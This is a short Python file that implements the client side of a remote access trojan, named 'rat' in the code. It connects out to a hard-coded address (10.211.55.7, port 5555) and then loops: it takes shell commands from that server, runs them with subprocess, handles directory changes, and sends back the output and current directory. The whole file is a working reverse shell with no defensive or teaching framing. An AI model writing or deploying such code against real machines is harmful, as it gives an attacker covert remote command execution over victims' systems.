
import socket
import subprocess
import os


class client_class:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.curdir = os.getcwd()
        self.BUFFER_SIZE = 1024 * 128
        self.SEPARATOR = "\n\n"

    def connection(self):
        try:
            global client
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.ip, self.port))
            client.send(self.curdir.encode())
        except Exception as error:
            print(error)


    def cmd(self):
        while True:
            # receive the command from the server
            command = client.recv(self.BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as error:
                    # if there is an error, set as the output
                    output = str(error)
                else:
                    # if operation is successful, empty message
                    output = ""
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{self.SEPARATOR}{cwd} > "
            client.send(message.encode())
        # close client connection
        client.close()


rat = client_class('10.211.55.7', 5555)


if __name__ == '__main__':
    rat.connection()
    rat.cmd()

